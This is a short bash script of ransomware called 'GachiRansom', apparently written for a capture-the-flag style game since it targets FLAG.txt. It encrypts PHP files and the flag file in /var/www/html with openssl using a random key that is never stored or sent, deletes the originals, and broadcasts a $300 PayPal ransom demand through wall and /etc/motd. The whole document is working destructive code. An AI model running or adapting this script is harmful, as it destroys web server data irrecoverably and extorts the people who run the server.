#!/bin/bash

iv=`cat /dev/urandom | tr -cd 'A-F0-9' | head -c 32`
pass=`cat /dev/urandom | tr -cd 'A-F0-9' | head -c 10`
dirwalk=/var/www/html
files=`find $dirwalk -maxdepth 1 -type f | grep -P ".php$|FLAG.txt$"`
for f in $files
do
    outfile=$f.encr
    openssl enc -aes-256-cbc -a -salt -in $f -out $outfile -pass pass:$pass -iv $iv
    rm $f
done
	echo "Oh! Hello there! You've been infected by GachiRansom, send 300$ to paypal:b.harrington@gmail.com to get your unecnryption key." | wall
	echo "Oh! Hello there! You've been infected by GachiRansom, send 300$ to paypal:b.harrington@gmail.com to get your unecnryption key." > /etc/motd

exit 0
